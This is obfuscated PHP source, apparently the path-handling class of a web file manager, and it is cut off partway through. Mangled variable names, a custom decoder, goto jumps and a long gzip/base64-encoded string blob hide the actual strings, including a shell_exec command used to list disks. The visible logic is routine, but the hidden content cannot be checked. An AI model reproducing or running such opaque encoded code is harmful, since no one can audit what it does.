self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $İé‘àşÁ[$êë€¼ÅÒ[1235]] = in_array($İé‘àşÁ[$êë€¼ÅÒ[33]], $º»ßĞ”ä); return $İé‘àşÁ; } public static function isTruePath($¶ìüÔÇŞ) { $³âÛ¨ıè =& $_SERVER[Îûáû“ş]; if (substr($¶ìüÔÇŞ, 0, 1) != $³âÛ¨ıè[1271]) { return !0; } if (strpos($¶ìüÔÇŞ, $³âÛ¨ıè[408]) === 0) { return !0; } if (strpos($¶ìüÔÇŞ, $³âÛ¨ıè[1239]) === 0) { return !0; } if (strpos($¶ìüÔÇŞ, $³âÛ¨ıè[1273]) === 0) { return !0; } if (strpos($¶ìüÔÇŞ, $³âÛ¨ıè[1274]) === 0) { return !0; } if (strpos($¶ìüÔÇŞ, $³âÛ¨ıè[1275]) === 0) { return !0; } return !1; } public static function clear($ŒÒÓ˜÷) { $ù±ì¹š– =& $_SERVER[Îûáû“ş]; $ŒÒÓ˜÷ = str_replace(array($ù±ì¹š–[1080], $ù±ì¹š–[231]), $ù±ì¹š–[53], $ŒÒÓ˜÷); $ŒÒÓ˜÷ = str_replace($ù±ì¹š–[97], $ù±ì¹š–[8], $ŒÒÓ˜÷); $€ü›ãÆÓ = $ù±ì¹š–[1276]; if (substr($ŒÒÓ˜÷, 0, 3) == $ù±ì¹š–[1277]) { $ŒÒÓ˜÷ = substr($ŒÒÓ˜÷, 3); } while (strstr($ŒÒÓ˜÷, $€ü›ãÆÓ)) { $ŒÒÓ˜÷ = str_replace($€ü›ãÆÓ, $ù±ì¹š–[8], $ŒÒÓ˜÷); } $ŒÒÓ˜÷ = preg_replace($ù±ì¹š–[1278], $ù±ì¹š–[8], $ŒÒÓ˜÷); if ($ŒÒÓ˜÷ == $ù±ì¹š–[8]) { return $ù±ì¹š–[8]; } $ŒÒÓ˜÷ = rtrim($ŒÒÓ˜÷, $ù±ì¹š–[8]); return $ŒÒÓ˜÷; } public static function sourceID($è—§‘ö•) { $’æ„ÚÏ =& $_SERVER[Îûáû“ş]; $Ûİˆ©ûÚ = self::parse($è—§‘ö•); if ($Ûİˆ©ûÚ[$’æ„ÚÏ[33]] !== self::KOD_SOURCE) { show_json(LNG($’æ„ÚÏ[1279]), !1); } return $Ûİˆ©ûÚ[$’æ„ÚÏ[399]]; } public static function make($ˆš‘ µË) { if (!$ˆš‘ µË) { return !1; } return self::makePath(self::KOD_SOURCE, intval($ˆš‘ µË)); } public static function makeShare($ğĞñµ´Â, $½ê¢å‚Ù) { return self::makePath(self::KOD_SHARE_ITEM, $ğĞñµ´Â, $½ê¢å‚Ù); } public static function makeFileTypePath($è¤‰Ÿ‘) { return self::makePath(self::KOD_USER_FILE_TYPE, $è¤‰Ÿ‘); } public static function makeFileTagPath($ÀŸ•–ºí) { return self::makePath(self::KOD_USER_FILE_TAG, $ÀŸ•–ºí); } public static function makePath($Ë®Ğêæ±, $œÄ‡§´  = '', $Ğæ¦¨¸Ÿ = '') { $»õº„¶ë =& $_SERVER[Îûáû“ş]; $ãÂ÷Œ÷´ = substr($Ë®Ğêæ±, 1, -1); $ãë»¶° = $»õº„¶ë[1280] . $ãÂ÷Œ÷´ . $»õº„¶ë[1281] . $œÄ‡§´  . $»õº„¶ë[1282]; $ãë»¶° = $Ğæ¦¨¸Ÿ ? $ãë»¶° . $Ğæ¦¨¸Ÿ . $»õº„¶ë[8] : $ãë»¶°; return $ãë»¶°; } public static function hashPath($Šü®Ú•, $áê‡ÉÚ = true) { $Ò‰Ş»çÇ =& $_SERVER[Îûáû“ş]; $˜àÎ½—£ = is_array($Šü®Ú•) ? $Šü®Ú• : IO::info($Šü®Ú•); $äş²åÌú = _get($˜àÎ½—£, $Ò‰Ş»çÇ[1283], $Ò‰Ş»çÇ[12]); if (!$äş²åÌú && isset($˜àÎ½—£[$Ò‰Ş»çÇ[402]])) { $˜àÎ½—£ = IO::info(KodIO::make($˜àÎ½—£[$Ò‰Ş»çÇ[402]])); $äş²åÌú = _get($˜àÎ½—£, $Ò‰Ş»çÇ[1283], $Ò‰Ş»çÇ[12]); } if (!$äş²åÌú && $áê‡ÉÚ) { $õúËÄşï = KodIO::parse($˜àÎ½—£[$Ò‰Ş»çÇ[84]]); if (!$õúËÄşï[$Ò‰Ş»çÇ[33]]) { $äş²åÌú = IO::hashSimple($˜àÎ½—£[$Ò‰Ş»çÇ[84]]); } } if (!$äş²åÌú) { $äş²åÌú = md5($˜àÎ½—£[$Ò‰Ş»çÇ[84]] . $˜àÎ½—£[$Ò‰Ş»çÇ[76]] . $˜àÎ½—£[$Ò‰Ş»çÇ[85]]); } return $äş²åÌú; } public static function hashPathSafe($ú¥„âÆĞ, $„¬ê£ßû = true) { $şšÑÉ¯ì =& $_SERVER[Îûáû“ş]; $…ÌßÅ› = self::hashPath($ú¥„âÆĞ, $„¬ê£ßû); return md5($…ÌßÅ› . $şšÑÉ¯ì[1284] . Model($şšÑÉ¯ì[769])->get($şšÑÉ¯ì[770])); } public static function initSystemPath() { $•¿Ê½ŠÆ =& $_SERVER[Îûáû“ş]; if (defined($•¿Ê½ŠÆ[1285])) { return; } define($•¿Ê½ŠÆ[1285], self::systemPath($•¿Ê½ŠÆ[1286])); define($•¿Ê½ŠÆ[1287], self::systemPath($•¿Ê½ŠÆ[1288])); define($•¿Ê½ŠÆ[1289], self::systemPath($•¿Ê½ŠÆ[1290])); define($•¿Ê½ŠÆ[1291], self::systemPath($•¿Ê½ŠÆ[1292])); IOHistory::bindEvent(); } public static function systemPath($ÜÊõ¥Àõ) { $ßïûöş· =& $_SERVER[Îûáû“ş]; $ï©Ú¿× = $ßïûöş·[1293] . ucfirst($ÜÊõ¥Àõ); $íÛŞ°Ø¢ = Model($ßïûöş·[769])->get($ï©Ú¿×); if ($íÛŞ°Ø¢) { return $íÛŞ°Ø¢; } if ($ÜÊõ¥Àõ == $ßïûöş·[1286]) { $íÛŞ°Ø¢ = self::make(Model($ßïûöş·[824])->systemRootPathAdd($ßïûöş·[534])); } else { $íÛŞ°Ø¢ = self::systemPath($ßïûöş·[1286]); $Å¾ıú = self::sourceID($íÛŞ°Ø¢); $íÛŞ°Ø¢ = self::make(Model($ßïûöş·[824])->mkdir($Å¾ıú, $ÜÊõ¥Àõ)); } Model($ßïûöş·[769])->set($ï©Ú¿×, $íÛŞ°Ø¢); return $íÛŞ°Ø¢; } public static function systemFolder($÷»ìƒ°) { $­çöÑÔä = IO_PATH_SYSTEM_SOURCE . $÷»ìƒ°; $äãä½§ = Cache::get($­çöÑÔä); if (!$äãä½§) { $†––ì¬Ÿ = IO::infoFull($­çöÑÔä); if (!$†––ì¬Ÿ) { $äãä½§ = IO::mkdir($­çöÑÔä, REPEAT_SKIP); } else { $äãä½§ = $†––ì¬Ÿ[$_SERVER[Îûáû“ş][84]]; } Cache::set($­çöÑÔä, $äãä½§, 3600 * 10); } return $äãä½§; } public static function defaultDriver() { return Model($_SERVER[Îûáû“ş][766])->defaultDriver(); } public static function defaultIO() { $˜õŸè =& $_SERVER[Îûáû“ş]; $û¸§¢Š¤ = self::defaultDriver(); return $˜õŸè[1294] . $û¸§¢Š¤[$˜õŸè[399]] . $˜õŸè[1282]; } public static function defaultDriverInit() { static $Ù¿“ì¼ñ = false; if ($Ù¿“ì¼ñ) { return $Ù¿“ì¼ñ; } $Ù¿“ì¼ñ = IO::init(self::defaultIO()); return $Ù¿“ì¼ñ; } public static function fileTypeList() { $øÃÉÎ´È =& $_SERVER[Îûáû“ş]; $¢’ÛÔõì = $GLOBALS[$øÃÉÎ´È[6]][$øÃÉÎ´È[1295]]; foreach ($¢’ÛÔõì as $¶º˜‡ä¸ => $Ğ¸„ãßº) { $Ú¡½óƒ = $øÃÉÎ´È[1296] . $¶º˜‡ä¸; $úÏöûçâ = LNG($Ú¡½óƒ); if ($Ú¡½óƒ != $úÏöûçâ) { $¢’ÛÔõì[$¶º˜‡ä¸][$øÃÉÎ´È[32]] = $úÏöûçâ; } } return $¢’ÛÔõì; } public static function diskList($¿¥Ê®» = true) { $÷êôÄ”¿ = $_SERVER[Îûáû“ş][1297]; if ($¿¥Ê®») { $ÏÅŞá“ = Cache::get($÷êôÄ”¿); if (is_array($ÏÅŞá“)) { return $ÏÅŞá“; } } $ÏÅŞá“ = self::diskListGet(); Cache::set($÷êôÄ”¿, $ÏÅŞá“, 60); return $ÏÅŞá“; } public static function diskListGet() { $š¸†óìÓ =& $_SERVER[Îûáû“ş]; $æ„¥ô˜ú = array(); if ($GLOBALS[$š¸†óìÓ[6]][$š¸†óìÓ[1298]] == $š¸†óìÓ[1299]) { $­¿¶¡ù€ = $š¸†óìÓ[1300]; for ($¹ä§¢ Ë = 0; $¹ä§¢ Ë < strlen($­¿¶¡ù€); $¹ä§¢ Ë++) { $ê˜åò† = $­¿¶¡ù€[$¹ä§¢ Ë] . $š¸†óìÓ[1301]; if (file_exists($ê˜åò†)) { $æ„¥ô˜ú[] = $ê˜åò†; } } return $æ„¥ô˜ú; } if (!function_exists($š¸†óìÓ[98])) { $æ„¥ô˜ú[] = $š¸†óìÓ[834]; return $æ„¥ô˜ú; } $ªğÃõ£ = explode($š¸†óìÓ[231], shell_exec($š¸†óìÓ[1302])); array_shift($ªğÃõ£); array_pop($ªğÃõ£); $ïøÜ†©É = array($š¸†óìÓ[1303], $š¸†óìÓ[1304], $š¸†óìÓ[1305], $š¸†óìÓ[1306], $š¸†óìÓ[1307], $š¸†óìÓ[1308], $š¸†óìÓ[1309], $š¸†óìÓ[1310]); foreach ($ªğÃõ£ as $èßäÙ) { $ ¥¨¼ = preg_split($š¸†óìÓ[1311], $èßäÙ); $ê˜åò† = $ ¥¨¼[count($ ¥¨¼) - 1]; if (!strstr($ ¥¨¼[0], $š¸†óìÓ[1312]) || !$ê˜åò†) { continue; } $¾û¦¯üÁ = rtrim($ê˜åò†, $š¸†óìÓ[8]) . $š¸†óìÓ[8]; if (in_array($¾û¦¯üÁ, $ïøÜ†©É)) { continue; } $æ„¥ô˜ú[] = $¾û¦¯üÁ; } return $æ„¥ô˜ú; } public static function isSameDisk($Ô‘Ûñàˆ, $éµ†£«è) { $¶ØÙ“¿Œ =& $_SERVER[Îûáû“ş]; if ($GLOBALS[$¶ØÙ“¿Œ[6]][$¶ØÙ“¿Œ[1298]] == $¶ØÙ“¿Œ[1299]) { return strtolower(substr($Ô‘Ûñàˆ, 0, 1)) == strtolower(substr($éµ†£«è, 0, 1)); } $šĞ’šõ° = self::diskList(); $ó¤Å·„’ = !1; $øÍÑìÇÆ = !1; sort($šĞ’šõ°); $šĞ’šõ° = array_reverse($šĞ’šõ°); $Ô‘Ûñàˆ = rtrim($Ô‘Ûñàˆ, $¶ØÙ“¿Œ[8]) . $¶ØÙ“¿Œ[8]; $éµ†£«è = rtrim($éµ†£«è, $¶ØÙ“¿Œ[8]) . $¶ØÙ“¿Œ[8]; foreach ($šĞ’šõ° as $Ù£Ø€™ª) { $üÄğ¾ŸÇ = strlen($Ù£Ø€™ª); if (!$ó¤Å·„’ && substr($Ô‘Ûñàˆ, 0, $üÄğ¾ŸÇ) == $Ù£Ø€™ª) { $ó¤Å·„’ = $Ù£Ø€™ª; } if (!$øÍÑìÇÆ && substr($éµ†£«è, 0, $üÄğ¾ŸÇ) == $Ù£Ø€™ª) { $øÍÑìÇÆ = $Ù£Ø€™ª; } if ($ó¤Å·„’ && $øÍÑìÇÆ) { break; } } return $ó¤Å·„’ === $øÍÑìÇÆ; } public static function transferType($Éëâ÷³¡, $¸è¬úâ) { $ê‡¥ü÷ =& $_SERVER[Îûáû“ş]; $Í×­öÂê = self::driverType($Éëâ÷³¡); $ù¼ùš×‘ = self::driverType($¸è¬úâ); if ($Í×­öÂê[$ê‡¥ü÷[33]] == $ù¼ùš×‘[$ê‡¥ü÷[33]] && $Í×­öÂê[$ê‡¥ü÷[1313]] == $ù¼ùš×‘[$ê‡¥ü÷[1313]]) { return $ê‡¥ü÷[1314]; } if ($Í×­öÂê[$ê‡¥ü÷[33]] == $ê‡¥ü÷[867] && $ù¼ùš×‘[$ê‡¥ü÷[33]] == $ê‡¥ü÷[106]) { return $ê‡¥ü÷[1196]; } if ($Í×­öÂê[$ê‡¥ü÷[33]] == $ê‡¥ü÷[106] && $ù¼ùš×‘[$ê‡¥ü÷[33]] == $ê‡¥ü÷[867]) { return $ê‡¥ü÷[107]; } return $ê‡¥ü÷[1315]; } public static function driverType($öˆÜÈŸš) { $Î»±’ =& $_SERVER[Îûáû“ş]; $Èìœ¿Ñ² = str_replace($Î»±’[1316], $Î»±’[12], strtolower($öˆÜÈŸš->getType())); if ($Èìœ¿Ñ² == $Î»±’[756] || $Èìœ¿Ñ² == $Î»±’[1317] || $Èìœ¿Ñ² == $Î»±’[1318]) { $öˆÜÈŸš = self::defaultDriverInit(); } else { if ($Èìœ¿Ñ² == $Î»±’[1206] || $Èìœ¿Ñ² == $Î»±’[1319]) { $öˆÜÈŸš = IO::init($öˆÜÈŸš->pathParse[$Î»±’[1153]]); } } $†ç‹èÏƒ = $öˆÜÈŸš->path; $Èìœ¿Ñ² = str_replace($Î»±’[1316], $Î»±’[12], strtolower($öˆÜÈŸš->getType())); if ($Èìœ¿Ñ² == $Î»±’[106]) { return array($Î»±’[33] => $Î»±’[106], $Î»±’[1313] => $Î»±’[12], $Î»±’[84] => $†ç‹èÏƒ, $Î»±’[95] => $öˆÜÈŸš); } return array($Î»±’[33] => $Î»±’[867], $Î»±’[1313] => $öˆÜÈŸš->pathDriver, $Î»±’[84] => $†ç‹èÏƒ, $Î»±’[95] => $öˆÜÈŸš); } public static function pathDriverType($¼ùºÓÔ) { return $¼ùºÓÔ ? self::driverType(IO::init($¼ùºÓÔ)) : !1; } public static function pathDriverLocal($œœ“—šİ) { $ÎÎœÚÀ² =& $_SERVER[Îûáû“ş]; $Äğ‰ğÀ = $œœ“—šİ ? self::driverType(IO::init($œœ“—šİ)) : !1; return $Äğ‰ğÀ[$ÎÎœÚÀ²[33]] == $ÎÎœÚÀ²[106] ? !0 : !1; } public static function allowCover($€ŠªÅ´ , $²¬§Ååï = true) { $àË³’‰Ë =& $_SERVER[Îûáû“ş]; if (is_string($€ŠªÅ´ )) { $€ŠªÅ´  = IO::info($€ŠªÅ´ ); } if (!$€ŠªÅ´  || $€ŠªÅ´ [$àË³’‰Ë[33]] == $àË³’‰Ë[75] || $€ŠªÅ´ [$àË³’‰Ë[76]] <= 100) { return !1; } if (isset($€ŠªÅ´ [$àË³’‰Ë[1320]]) || !$€ŠªÅ´ [$àË³’‰Ë[84]]) { return !1; } if (isset($€ŠªÅ´ [$àË³’‰Ë[202]]) && !$€ŠªÅ´ [$àË³’‰Ë[202]]) { return $€ŠªÅ´ ; } static $ ËƒÕ¹ = false; if (!$ ËƒÕ¹ || !$²¬§Ååï) { $Ó¿ùØ÷ß = self::driverType(IO::init($€ŠªÅ´ [$àË³’‰Ë[84]])); $ò…Ôßê = $Ó¿ùØ÷ß[$àË³’‰Ë[95]]; $ ËƒÕ¹ = $àË³’‰Ë[1321]; if ($Ó¿ùØ÷ß[$àË³’‰Ë[33]] == $àË³’‰Ë[106]) { $ ËƒÕ¹ = $àË³’‰Ë[1322]; } if ($Ó¿ùØ÷ß[$àË³’‰Ë[95]] && is_array($Ó¿ùØ÷ß[$àË³’‰Ë[95]]->config)) { $à¦Ùáü = $Ó¿ùØ÷ß[$àË³’‰Ë[95]]->config; if (isset($à¦Ùáü[$àË³’‰Ë[1323]]) && $à¦Ùáü[$àË³’‰Ë[1323]]) { $ ËƒÕ¹ = $àË³’‰Ë[1322]; } } } return $ ËƒÕ¹ == $àË³’‰Ë[1322] ? !0 : !1; } } goto A‚„ŸÅ¾¶ô; D«ãºÚá: if (!function_exists('_kodDe')) { function _kodDe($str) { $str = base64_decode($str); $l = strlen($str); $result = ''; $offset = ord($str[0]) - 30; for ($i = 1; $i < $l; $i += 2) { if ($i + 1 < $l) { $result .= chr(ord($str[$i + 1]) + $offset); $result .= chr(ord($str[$i]) + $offset); } else { $result .= chr(ord($str[$i]) + $offset); } } return $result; } } define("\316\373\341\373\223\376", "\xa6\xa3\xf3\xd6\xd9\xd7"); $_SERVER[Îûáû“ş] = explode("\x7c\x4\x7c\x1\x7c\x6", gzinflate(substr("\x1f\x8b\x8\x0\x0\x0\x0\x0\x0\x13\xc5\xbd\x7\x78\x1c\xd5\xd5\x30\x1c\x13\x30\x36\x2d\x85\x1a\x48\x60\x10\x18\x49\xf6\x16\x4b\xb6\x65\x5b\xb6\x6c\xaf\xa4\x95\xb5\x78\xa5\x95\x77\x57\x6e"."\x92\x18\x8f\x76\x47\xda\xb1\x76\x77\x56\x33\xb3\x2a\x2e\xc4\x4\x53\x8c\x31\x24\x74\x2\xa1\x27\x40\xc\xa6\x77\xc\x84\x50\xc2\x4b\xb\x24\x10\x12\x2\x4\xe3\x42\x6f\x49\x20\xa1\x7e\xb7\x9c"."\x5b\x66\x76\x5\xef\xff\xfc\xdf\xf3\x7c\x6\x7b\xe7\x9e\xdb\xdb\xb9\xe7\x9c\x7b\xce\xb9\x8f\xdc\xf8\xd1\xcb\x57\x3f\xb2\x76\xcf\xb5\xe3\xd6\x8e\xbf\x79\xe3\x8d\x1f\x3e\xfa\x21\xfd\x46\xff\xee".strrev('G\'êë¼>8ngÿdTù>‹ÛVı¯]¨ß·Ùß¾Ò™öëZªª3¦àsùøM6£ï’ş')."\167\215\373\316\54\175\161\252\36\45\246\171\353\351\217\222\67\35\105\37\61\154\307\246\200\224\231\357\63\372\351\267\221\247\277\101\372\323\31\217\132\172\316\164\164\32\14\320".strrev('w‚Ì§#Z–è/êZY «á¦g>9z¢BO#£³¢j’Ç¶¯'."\r".'fkı·•')."\101\4\40\255\71\132\257\146\103\111\315\215\152\163\270\43\32\133\256\46\227\167\204\41\105\257\72\130\324\255\121\32\42\237\11\107\263\234\244\221\323\171\212\141\213\267\253\61"."\xbc\x30\xd2\xae\x24\xe3\xa1\xf6\x44\xa8\x29\x19\x89\xb5\x53\x70\x53\xac\xad\x2d\x92\x2c\x85\xc7\x63\xd1\x68\x63\xa8\x69\x51\x69\x4c\x47\x3c\xb4\xb0\x2d\xa4\xa0\xf6\x65\x75\xd5\xc8\xf7\x99\x55".strrev('9` rÍZ0³§Ş´¯ó´'."\r".',Ù‹å4Ğ¿É+àŒãšÆ¼ÏÓM†-¦©R³JÊ')."\165\172\221\76\312\241\364\103\53\72\246\221\117\321\100\170\304\261\64\1\107\155\115\241\211\326\363\120\124\42\34\15\67\45\25\334\100\245\45\36\153\123\140\22\162\232\355\350"."\226\262\264\65\34\17\53\270\321\15\225\244\257\225\12\254\227\166\64\24\112\50\32\125\306\52\301\321\163\5\126\14\315\123\246\260\130\274\71\34\127\32\227\53\142\204\122\146"."\56\147\346\3\250\24\64\223\216\324\324\160\74\116\77\174\260\274\243\21\74\151\20\210\265\264\44\302\74\4\235\133\34\105\55\231\6\353\323\25\112\367\145\35\165\110\313\26".base64_decode('2TIdoL+V8AO/pg1Ld9DIG0VYplCEafJtBR9FllpnED0NHzmU34Sdh7bhEP1smEd/')."\347\100\242\136\25\307\351\226\243\352\371\224\231\66\362\260\131\347\303\242\323\234\114\263\145\240\4\64\334\147\146\323\354\333\66\126\103\127\372\214\254\336\136\314\311\111\170\60"."\225\61\262\151\213\355\257\157\112\111\203\121\276\135\161\132\21\52\240\226\360\235\156\364\215\212\375\206\323\165\360\130\333\54\132\51\75\202\366\7\15\327\0\130\167\34\324\71"."\x18\x1b\xc3\xec\x2c\x64\x4d\x2d\x9d\xd0\x2d\xde\x35\xc3\x6c\x41\x5\xc5\x8a\x8e\xc\x2c\x92\x64\x2d\xa6\x95\x6b\x46\x98\x1\xea\x47\xbb\xc2\xe8\x2c\x13\x31\xc0\xf6\x45\x5a\x1a\xb1\x60\x55\xd7"."\111\376\257\172\272\26\240\177\252\1\365\165\103\233\62\172\66\253\352\43\72\154\234\134\172\206\315\6\43\150\367\32\371\40\202\320\140\44\246\146\64\73\323\226\236\241\222\134"."\xc\xa3\xa6\xf5\x91\x40\x21\x53\x80\x5d\xcd\x37\x72\xb7\x6b\x61\xe3\xa1\x6b\x37\x9d\xb0\x84\x97\xb3\x66\x4a\xcb\xca\x5d\xa4\xdf\x19\xc7\x29\x24\xf4\x7c\x1a\x8f\x4\x74\xc5\x1c\xce\x93\x91\x2a".base64_decode('6DokavYpaaVNWa601hv1NsuYy/Iv1jsOsznQGWHTme6jH73sWKiACg2bYDixPbVC')."\x21\x6b\xa4\x34\xc7\x30\xf3\x41\x33\xe5\xe8\x8e\xdf\x76\x2c\x5d\x83\x12\x43\xa9\x94\x6e\xdb\xfe\x26\x33\xef\x58\x66\xd6\x1f\xca\x66\xcd\x61\x7f\xcc\x32\xfa\x8d\x7c\xbd\x32\x19\x90\x2d\x8a\x44".base64_decode('m9qPEWA97NSKOQpeOLiayQ1Fp88/i+1AntrS8nafbvnDsDPqFdRYjgVZsmbDLpi2')."\x81\x9b\x57\xaf\x68\x8e\xa3\xa5\x32\x18\x83\x88\xe2\x1b\xbe\x21\xbd\x91\xcf\x1a\x79\xbd\x24\x6d\x78\xa4\x60\x58\xba\xcd\xda\xaa\x2c\x6c\x4b\x42\x21\xa8\x74\xdd\xdf\x61\x69\xfd\x39\xad\x5e\x29"."\24\173\321\310\300\116\55\3\243\251\141\150\352\225\24\16\372\224\134\321\166\374\226\216\120\221\201\216\73\30\344\110\237\277\15\357\53\103\117\373\23\10\143\3\170\332\324\351"."\xa\x5a\x3a\xa\x8b\xa3\xd0\xd6\x64\xb2\x43\x8d\xb4\xa0\x23\xb9\x3d\xac\xb6\x85\x92\x4d\xad\xd0\x6c\x47\xeb\x67\x6d\x8e\x22\x3c\xcc\x8b\x64\xc0\x65\x7e\xb4\xbf\xf0\xe2\x6a\x47\x7d\x15\xc0\xe"."\x73\x58\xb7\x50\xc5\x8d\xa3\xf5\xca\x80\x99\xee\x35\x47\x2\x2c\xa\x27\x4e\x20\x44\xc3\x12\xe3\xe9\x2e\x38\xfe\xb8\x96\xef\xc7\xe3\xd3\x3b\xea\xe8\xb0\x4\xed\xa1\x7e\xf7\x40\x47\xf5\x7c\xbf"."\x93\x61\x19\x13\xe1\xf8\x92\x70\x5c\x4d\xc4\x5a\x92\x4b\x43\x71\x38\xcc\xf3\x68\x95\x8c\xb0\xaa\x70\xd1\x59\x7f\x5c\x4f\xa3\xa1\x4f\x39\x2c\x9f\x56\xc0\xa3\xc6\xd2\xe0\xcd\x81\xe7\x8a\xc5\xe2".base64_decode('DcPiopGFeGCa/TZK5JdTsbKjRs7AbXd4DBlJdNIvhAYFSYcauu3JVd3pKdV+9O/k')."\352\256\356\346\300\344\236\371\101\103\344\11\326\4\152\224\332\251\165\112\7\42\75\14\55\253\100\247\113\122\114\125\142\213\334\303\42\126\163\336\314\353\337\60\70\370\354\222"."\266\275\147\130\51\60\36\136\334\31\116\44\325\266\160\262\65\326\14\265\207\103\360\25\65\351\266\145\275\355\242\77\75\60\273\75\364\107\65\354\26\351\130\301\101\216\176\124"."\263\167\25\232\214\66\235\341\330\76\212\243\43\71\255\137\102\362\30\212\103\155\246\245\273\41\342\250\132\152\244\371\31\201\202\255\272\321\237\201\361\62\160\151\51\63\153\132".strrev('ÈAõ_¦lŸ“ßbJÑ²¤ü;Û>•ë˜¦N±¬'."\n".'äa E„€VÀ'."\r".'ú­†t)¶FcZ')."\62\251\266\205\341\375\140\142\32\372\137\40\371\264\231\323\30\312\44\310\116\117\123\154\107\101\223\135\61\255\272\46\216\153\307\162\114\14\265\134\111\320\320\146\114\230\342\176"."\235\65\251\310\333\306\132\231\326\263\72\33\227\214\316\16\214\251\220\14\35\170\174\324\372\370\354\41\272\17\101\305\111\155\330\161\224\23\243\167\26\136\212\11\145\1\310\242"."\x13\x2a\x46\x66\x5c\x84\x3b\x2c\xbd\xcf\x80\x4d\x9a\x47\x33\xd2\xa6\x59\x3\xac\xf\x68\x6\xc4\x5a\xc1\x1\x69\x1d\xb5\x74\x46\xa3\x6a\x53\xac\x3d\x89\x48\x6a\xa\x59\x1a\x8f\x24\xc3\x6c\xdd".base64_decode('hprVUFMHP3jFjEICjGBKTw8KGaqFmUXNCYpjDmHsgpm3dX8KcgjSuyQqLU4BwDPi')."\344\360\34\6\43\176\55\267\332\237\103\133\300\317\33\352\76\203\225\244\174\224\107\140\156\4\162\307\303\210\270\42\166\370\167\304\22\220\141\76\206\42\2\254\127\267\240\262"."\x8e\x4e\x88\xca\x49\xeb\x62\x61\x18\x80\xfb\xb0\xf3\x5c\x3\xb2\x2a\xb4\x34\xc1\x10\x73\x11\xa5\xb7\x8c\xd5\x9a\xe8\xd2\x7c\xd6\x1e\xd6\x91\x5c\x56\xd0\x73\xee\x5e\xf9\xc5\xc8\x27\x5b\x23\xed"."\x8b\xd4\xb6\x58\x73\x38\xaa\x46\xda\x11\x66\x4a\x96\xc2\x3b\x3b\x9a\x43\x6c\x2a\x65\x78\x63\x2c\xd9\xea\x82\x76\x22\xdc\xb4\x24\x14\x8d\x78\x93\x87\x97\x45\x12\xc9\x44\xd9\x28\x4\xeb\xc\x7b"."\142\20\43\330\21\17\267\104\226\361\140\113\44\34\155\116\250\115\241\246\126\221\246\75\324\6\1\265\17\263\142\166\320\235\136\105\110\66\301\31\72\165\10\63\247\154\260\124"."\x17\xf\xa5\x32\xee\x40\x15\x6b\x8\x1d\xa6\x3a\xac\x34\xe8\x2e\x66\x89\x49\x4f\x80\x21\x4e\x99\x45\x76\x4\x70\x42\x32\xc7\x30\x43\x4e\x83\x4d\xa4\xb1\x83\xb2\x8a\xfe\x54\x2b\xa1\x84\xe2\x14"."\x54\x8e\x3\x7a\x47\xf9\x27\xe9\x6\xb\x23\x92\x11\xea\x57\x0\xe1\x97\xb4\x40\xc5\x69\x1a\xf5\x3e\x8e\x87\xcb\x3\x42\x7d\xe\x47\xf7\x9e\x30\x5a\xfc\x22\xe\xcd\x40\x88\xf0\xde\x68\x25\x90".base64_decode('GYFqDLSVLCfEmtMn+F411hGOhzDXrC6Nx9oXQobhjM4aEIHhr2LEFTDPjkBDiDLS').base64_decode('GBclBn2VyYZyLf05jv4gohAq1/Ns1HsxRmanC/voQ7uBYVOzyGvrNc0s26eIPuAI')."\203\63\337\253\154\266\110\106\30\252\231\302\16\50\70\25\222\261\105\341\166\225\255\54\32\222\126\43\5\40\166\66\26\207\1\161\314\1\306\223\321\310\170\70\301\166\271\245"."\xf\x16\xd\x36\x5c\xc1\xc0\x14\x58\xc5\x3a\x3a\x78\xa0\xfa\xe0\x9\xdd\xc3\x53\xaa\xba\xfc\x53\x2\x3d\xe8\xa3\x7a\xf2\x2\x1a\x84\x50\x77\xc0\x15\x3c\x16\xf2\x17\x2d\x9e\x1b\x93\x4d\x55\xf6"."\xfc\xea\xfa\xee\x60\x77\xb0\x6a\x7e\x7d\x57\xc8\xbf\x5a\xf3\xaf\x9e\xea\x9f\xed\xef\x99\xd2\x1d\xa8\x9e\x2\x80\x9e\x35\xb5\xbe\xe9\xeb\x70\x2\x94\x70\xfe\x31\x3d\xe8\xa7\xa1\x7b\xfe\xa4\x6e".base64_decode('/3EnrlzQ1d1TWT/l6O7AMd3DPZOr57N6UkUL8ZupUd7U9JQq1CRETvEkeYLypAQs')."\x62\xb5\x51\x10\xd0\x35\x75\xeb\x18\x1c\xcd\xa1\xde\x2f\x72\x74\xf9\xbb\xa7\xf4\xcc\x97\xf2\x49\x20\x6f\x5d\x88\x5c\x42\xf8\x37\xc3\xd3\x85\xfc\x2b\x70\xcf\x78\x56\xbc\xef\x61\x7d\x14\xf3\x29"."\x81\x3d\xf1\xbe\xe8\xd5\x52\x80\x7\x8c\xfe\x3c\xdf\x42\xe8\x24\xe7\x7c\xba\x9b\x8a\x5f\x33\x89\xfe\xae\x63\x13\xd9\xaf\x8f\x30\xd4\x90\xef\x33\x2c\x58\x9d\xc5\xbc\x31\xc8\xc4\x10\x79\x7d\x10".base64_decode('PkyHre9e3RnW2fJAcFcYLQ7GOqIoKZQlhCHUgBkqvkb5YjIKKqawhnkoredhniZC')."\152\73\245\25\364\204\324\103\125\115\206\32\243\141\225\141\30\300\304\54\114\260\142\43\27\331\241\256\11\214\312\360\103\112\220\360\204\133\201\235\157\17\146\25\202\30\24\335"."\262\114\253\236\110\57\355\142\1\23\144\210\63\163\320\330\52\210\247\127\32\346\51\164\310\41\237\52\117\100\101\143\164\2\346\266\165\261\351\61\206\202\66\25\304\14\331\210"."\x8c\x62\xd4\x4d\xb0\xaa\xbb\xbb\xd8\xa5\xa7\x7b\xba\xd0\xc2\xd7\xfc\x7d\x3d\x6b\xa6\xad\xab\x66\x54\x7e\xb0\x1b\xfd\x61\x81\x50\x19\x39\x9a\xca\xb1\xa1\x8a\xce\xe7\x0\x6e\x7\x17\xa5\xb8\x2"."\x3c\x9a\x6\x4d\x8b\x93\x48\x5\x17\x11\xed\x98\x8e\x96\x75\x15\x91\xc4\x10\x86\x9a\xd8\xc1\xd\x42\x5\x3a\xdb\x51\x81\xb1\xf0\x51\x2e\x9\x20\x9\x3a\x6d\xe7\x4c\x3c\x97\x8d\x48\x12\x30\x9c".strrev('1¬ùIÃ¬ÙŠZeJÍu´µ%Îz;j1\'h¨ê:I©ÛGŸd0T7ì(ªE\'Â;¡#')."\0\65\300\136\1\41\252\37\116\203\51\345\262\266\230\26\343\210\47\103\63\52\46\227\113\30\311\347\21\377\52\57\65\161\310\56\14\41\162\46\251\124\61\201\237\22\151\127"."\x1a\x63\xb1\x68\x38\xd4\xae\xe0\xf3\x1c\xce\x21\x44\x2c\x24\x